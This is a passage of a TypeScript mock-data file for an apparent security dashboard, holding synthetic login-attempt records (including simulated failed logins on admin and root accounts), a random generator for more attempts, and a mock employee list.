  { id: 'LA005', userName: '刘洋', userId: 'U005', sourceIp: '183.6.112.88', country: '中国', city: '广州', timestamp: '2026-05-18T07:30:00Z', status: 'success', success: true, authMethod: '密码', userAgent:  'Windows 10 - Chrome', failureReason: '' },
  { id: 'LA006', userName: 'admin', userId: '', sourceIp: '185.220.101.34', country: '中国', city: '莫斯科', timestamp: '2026-05-09T03:15:00Z', status: 'failed', success: false, authMethod: '密码', userAgent:  'Unknown', failureReason: '密码错误' },
  { id: 'LA007', userName: 'admin', userId: '', sourceIp: '185.220.101.34', country: '中国', city: '莫斯科', timestamp: '2026-05-09T03:15:05Z', status: 'failed', success: false, authMethod: '密码', userAgent:  'Unknown', failureReason: '密码错误' },
  { id: 'LA008', userName: 'root', userId: '', sourceIp: '185.220.101.34', country: '中国', city: '莫斯科', timestamp: '2026-05-09T03:15:10Z', status: 'failed', success: false, authMethod: '密码', userAgent:  'Unknown', failureReason: '用户不存在' },
  { id: 'LA009', userName: 'admin', userId: '', sourceIp: '185.220.101.34', country: '中国', city: '莫斯科', timestamp: '2026-05-09T03:15:15Z', status: 'failed', success: false, authMethod: '密码', userAgent:  'Unknown', failureReason: '密码错误' },
  { id: 'LA010', userName: 'zhangwei', userId: 'U001', sourceIp: '91.234.56.78', country: '中国', city: '莫斯科', timestamp: '2026-05-09T06:45:00Z', status: 'success', success: true, authMethod: '密码', userAgent:  'Linux - Firefox', failureReason: '' },
  { id: 'LA011', userName: '赵敏', userId: 'U006', sourceIp: '202.96.128.66', country: '中国', city: '深圳', timestamp: '2026-05-18T07:30:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'Windows 11 - Chrome', failureReason: '' },
  { id: 'LA012', userName: '孙浩', userId: 'U007', sourceIp: '210.22.88.99', country: '中国', city: '成都', timestamp: '2026-05-18T06:00:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'Linux - Firefox', failureReason: '' },
  { id: 'LA013', userName: 'root', userId: '', sourceIp: '185.220.101.35', country: '中国', city: '莫斯科', timestamp: '2026-05-08T14:22:00Z', status: 'failed', success: false, authMethod: 'SSH密钥', userAgent:  'Unknown', failureReason: '密钥验证失败' },
  { id: 'LA014', userName: 'deploy', userId: '', sourceIp: '185.220.101.35', country: '中国', city: '莫斯科', timestamp: '2026-05-08T14:22:05Z', status: 'failed', success: false, authMethod: 'SSH密钥', userAgent:  'Unknown', failureReason: '密钥验证失败' },
  { id: 'LA015', userName: 'admin', userId: '', sourceIp: '185.220.101.35', country: '中国', city: '莫斯科', timestamp: '2026-05-08T14:22:10Z', status: 'failed', success: false, authMethod: '密码', userAgent:  'Unknown', failureReason: '密码错误' },
  { id: 'LA016', userName: '周静', userId: 'U008', sourceIp: '180.168.45.67', country: '中国', city: '上海', timestamp: '2026-05-18T08:30:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'Windows 11 - Edge', failureReason: '' },
  { id: 'LA017', userName: '吴强', userId: 'U009', sourceIp: '115.210.55.33', country: '中国', city: '南京', timestamp: '2026-05-18T09:15:00Z', status: 'success', success: true, authMethod: '密码', userAgent:  'iPhone - Safari', failureReason: '' },
  { id: 'LA018', userName: '郑丽', userId: 'U010', sourceIp: '101.231.78.44', country: '中国', city: '上海', timestamp: '2026-05-18T08:30:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'MacBook Air - Safari', failureReason: '' },
  { id: 'LA019', userName: 'liuyang', userId: 'U005', sourceIp: '41.58.67.89', country: '中国', city: '拉各斯', timestamp: '2026-05-09T03:00:00Z', status: 'success', success: true, authMethod: '密码', userAgent:  'Unknown', failureReason: '' },
  { id: 'LA020', userName: '冯涛', userId: 'U011', sourceIp: '125.120.200.88', country: '中国', city: '杭州', timestamp: '2026-05-18T08:00:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'Windows 10 - Chrome', failureReason: '' },
  { id: 'LA021', userName: '褚琳', userId: 'U012', sourceIp: '60.12.34.56', country: '中国', city: '北京', timestamp: '2026-05-18T08:00:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'Android - Chrome', failureReason: '' },
  { id: 'LA022', userName: '卫东', userId: 'U013', sourceIp: '113.87.65.43', country: '中国', city: '北京', timestamp: '2026-05-18T07:00:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'MacBook Pro - Chrome', failureReason: '' },
  { id: 'LA023', userName: '蒋华', userId: 'U014', sourceIp: '122.224.100.22', country: '中国', city: '上海', timestamp: '2026-05-18T09:00:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'Windows Server 2022 - RDP', failureReason: '' },
  { id: 'LA024', userName: '沈雪', userId: 'U015', sourceIp: '36.110.88.77', country: '中国', city: '北京', timestamp: '2026-05-18T09:30:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'iPhone - Safari', failureReason: '' },
  { id: 'LA025', userName: '韩超', userId: 'U016', sourceIp: '211.102.45.66', country: '中国', city: '深圳', timestamp: '2026-05-18T09:30:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'MacBook Pro - Safari', failureReason: '' },
  { id: 'LA026', userName: '杨帆', userId: 'U017', sourceIp: '222.73.55.88', country: '中国', city: '上海', timestamp: '2026-05-18T08:00:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'Windows 11 - Chrome', failureReason: '' },
  { id: 'LA027', userName: 'root', userId: '', sourceIp: '103.45.67.90', country: '中国', city: '上海', timestamp: '2026-05-07T11:20:00Z', status: 'failed', success: false, authMethod: '密码', userAgent:  'Unknown', failureReason: '用户不存在' },
  { id: 'LA028', userName: 'admin', userId: '', sourceIp: '103.45.67.90', country: '中国', city: '上海', timestamp: '2026-05-07T11:20:01Z', status: 'failed', success: false, authMethod: '密码', userAgent:  'Unknown', failureReason: '密码错误' },
  { id: 'LA029', userName: 'zhangwei', userId: '', sourceIp: '103.45.67.90', country: '中国', city: '上海', timestamp: '2026-05-07T11:20:02Z', status: 'failed', success: false, authMethod: '密码', userAgent:  'Unknown', failureReason: '密码错误' },
  { id: 'LA030', userName: 'lina', userId: '', sourceIp: '103.45.67.90', country: '中国', city: '上海', timestamp: '2026-05-07T11:20:03Z', status: 'failed', success: false, authMethod: '密码', userAgent:  'Unknown', failureReason: '密码错误' },
  { id: 'LA031', userName: 'chengang', userId: 'U004', sourceIp: '103.45.67.90', country: '中国', city: '上海', timestamp: '2026-05-07T11:20:04Z', status: 'success', success: true, authMethod: '密码', userAgent:  'Unknown', failureReason: '' },
  { id: 'LA032', userName: '朱婷', userId: 'U018', sourceIp: '116.228.77.99', country: '中国', city: '上海', timestamp: '2026-05-18T08:45:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'Android - Chrome', failureReason: '' },
  { id: 'LA033', userName: '秦明', userId: 'U019', sourceIp: '124.160.88.11', country: '中国', city: '杭州', timestamp: '2026-05-18T06:30:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'Windows 10 - Edge', failureReason: '' },
  { id: 'LA034', userName: '许佳', userId: 'U020', sourceIp: '218.242.33.44', country: '中国', city: '北京', timestamp: '2026-05-18T09:15:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'MacBook Air - Safari', failureReason: '' },
  { id: 'LA035', userName: '吕峰', userId: 'U021', sourceIp: '61.152.100.55', country: '中国', city: '上海', timestamp: '2026-05-18T07:00:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'Windows 11 - Chrome', failureReason: '' },
  { id: 'LA036', userName: '施蕾', userId: 'U022', sourceIp: '58.34.66.77', country: '中国', city: '成都', timestamp: '2026-05-18T08:45:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'iPhone - Safari', failureReason: '' },
  { id: 'LA037', userName: '张磊', userId: 'U023', sourceIp: '101.81.44.22', country: '中国', city: '苏州', timestamp: '2026-05-18T09:00:00Z', status: 'success', success: true, authMethod: 'SSH密钥', userAgent:  'MacBook Pro - Chrome', failureReason: '' },
  { id: 'LA038', userName: '钱进', userId: 'U024', sourceIp: '123.125.33.66', country: '中国', city: '北京', timestamp: '2026-05-18T08:00:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'Linux - Firefox', failureReason: '' },
  { id: 'LA039', userName: '吴涛', userId: 'U025', sourceIp: '220.181.55.88', country: '中国', city: '北京', timestamp: '2026-05-18T05:30:00Z', status: 'success', success: true, authMethod: '密码', userAgent:  'Windows 10 - Chrome', failureReason: '' },
  { id: 'LA040', userName: '黄强', userId: 'U026', sourceIp: '124.127.88.99', country: '中国', city: '深圳', timestamp: '2026-05-18T09:00:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'iPhone - Safari', failureReason: '' },
  { id: 'LA041', userName: '赵磊', userId: 'U027', sourceIp: '221.219.44.55', country: '中国', city: '北京', timestamp: '2026-05-18T09:00:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'Windows 11 - Edge', failureReason: '' },
  { id: 'LA042', userName: 'admin', userId: '', sourceIp: '45.33.32.100', country: '中国', city: '洛杉矶', timestamp: '2026-05-06T16:00:00Z', status: 'failed', success: false, authMethod: '密码', userAgent:  'Unknown', failureReason: '密码错误' },
  { id: 'LA043', userName: 'jenkins', userId: '', sourceIp: '45.33.32.100', country: '中国', city: '洛杉矶', timestamp: '2026-05-06T16:00:01Z', status: 'failed', success: false, authMethod: '密码', userAgent:  'Unknown', failureReason: '密码错误' },
  { id: 'LA044', userName: '孙丽', userId: 'U028', sourceIp: '114.243.66.77', country: '中国', city: '重庆', timestamp: '2026-05-18T08:30:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'MacBook Air - Safari', failureReason: '' },
  { id: 'LA045', userName: '周敏', userId: 'U029', sourceIp: '61.135.88.11', country: '中国', city: '北京', timestamp: '2026-05-18T09:00:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'Android - Chrome', failureReason: '' },
  { id: 'LA046', userName: '林峰', userId: 'U030', sourceIp: '218.108.55.66', country: '中国', city: '杭州', timestamp: '2026-05-18T07:45:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'MacBook Pro - Chrome', failureReason: '' },
  { id: 'LA047', userName: '何欣', userId: 'U031', sourceIp: '124.42.33.44', country: '中国', city: '广州', timestamp: '2026-05-18T09:30:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'iPhone - Safari', failureReason: '' },
  { id: 'LA048', userName: '马骏', userId: 'U032', sourceIp: '222.35.77.88', country: '中国', city: '北京', timestamp: '2026-05-18T06:00:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'Windows 10 - Chrome', failureReason: '' },
  { id: 'LA049', userName: 'root', userId: '', sourceIp: '45.33.32.102', country: '中国', city: '洛杉矶', timestamp: '2026-05-06T03:00:00Z', status: 'failed', success: false, authMethod: '密码', userAgent:  'Unknown', failureReason: '密码错误' },
  { id: 'LA050', userName: '高远', userId: 'U033', sourceIp: '114.88.23.45', country: '中国', city: '北京', timestamp: '2026-05-08T20:00:00Z', status: 'success', success: true, authMethod: '密码', userAgent:  'Windows 10 - Chrome', failureReason: '' },
  { id: 'LA051', userName: '罗薇', userId: 'U034', sourceIp: '222.35.66.77', country: '中国', city: '北京', timestamp: '2026-05-18T09:00:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'MacBook Pro - Safari', failureReason: '' },
  { id: 'LA052', userName: '谢勇', userId: 'U035', sourceIp: '123.120.88.45', country: '中国', city: '杭州', timestamp: '2026-05-18T08:30:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'Windows 11 - Chrome', failureReason: '' },
  { id: 'LA053', userName: 'wangfang', userId: 'U003', sourceIp: '45.77.123.45', country: '中国', city: '东京', timestamp: '2026-05-09T07:00:00Z', status: 'success', success: true, authMethod: '密码', userAgent:  'Linux - Firefox', failureReason: '' },
  { id: 'LA054', userName: 'svc_hids', userId: '', sourceIp: '10.0.5.100', country: '中国', city: '北京', timestamp: '2026-05-18T00:00:00Z', status: 'success', success: true, authMethod: 'API密钥', userAgent:  'Server', failureReason: '' },
  { id: 'LA055', userName: 'svc_siem', userId: '', sourceIp: '10.0.5.101', country: '中国', city: '北京', timestamp: '2026-05-18T00:00:00Z', status: 'success', success: true, authMethod: 'API密钥', userAgent:  'Server', failureReason: '' },
]

function generateLoginAttempt(index: number): LoginAttempt {
  const userEntry = pick(DEPT_USERS)
  const isFailed = Math.random() > 0.7
  const authMethods = ['密码', '密码+MFA', 'SSH密钥', 'API密钥', '证书']
  const failureReasons = ['密码错误', '用户不存在', 'MFA验证失败', '账户已锁定', 'IP不在白名单', '令牌过期']
  const locations = [...CITIES, ...OVERSEAS_CITIES]
  return {
    id: `LA${String(index + 56).padStart(3, '0')}`,
    userName: isFailed ? pick(['admin', 'root', 'test', 'deploy', 'backup']) : userEntry.userName,
    userId: isFailed ? '' : userEntry.userId,
    sourceIp: generateIP(pick([...PUBLIC_IPS.slice(0, 5), ...INTERNAL_IPS.slice(0, 3)])),
    country: '中国',
    city: pick(locations),
    userAgent: pick([...USER_AGENTS, 'Unknown', 'Server', 'Mobile Device']),
    location: pick(locations),
    timestamp: formatISO(randomDate(30, 0)),
    success: !isFailed,
    status: isFailed ? 'failed' : 'success',
    authMethod: pick(authMethods),
    deviceType: pick([...USER_AGENTS, 'Unknown', 'Server', 'Mobile Device']),
    failureReason: isFailed ? pick(failureReasons) : '',
  }
}

function generateLoginAttempts(count: number): LoginAttempt[] {
  const result: LoginAttempt[] = []
  for (let i = 0; i < count; i++) result.push(generateLoginAttempt(i))
  return result
}

export const mockLoginAttempts: LoginAttempt[] = [...staticLoginAttempts, ...generateLoginAttempts(150)]

/* ========= Users ========= */

export const mockUsers: User[] = DEPT_USERS.map((u, i) => ({
  id: u.userId,
  name: u.userName,
  email: `${u.userName.toLowerCase()}@secmind.com`,
  department: u.department,
  position: pick(POSITIONS),
  level: i < 3 ? '高级' : i < 10 ? '中级' : '初级',
  manager: i < 3 ? '-' : pick(DEPT_USERS.slice(0, 3)).userName,
  isSensitive: i < 5 || (i >= 15 && i < 20),
  office: pick(OFFICES),
  recentLoginLocation: pick(['北京', '上海', '深圳', '杭州']),
  isOnLeave: i > 28 && i < 32,
  isResigned: i > 32,
  avatar: '',
}))

export { TOTAL_ALERTS, ALL_ALERTS }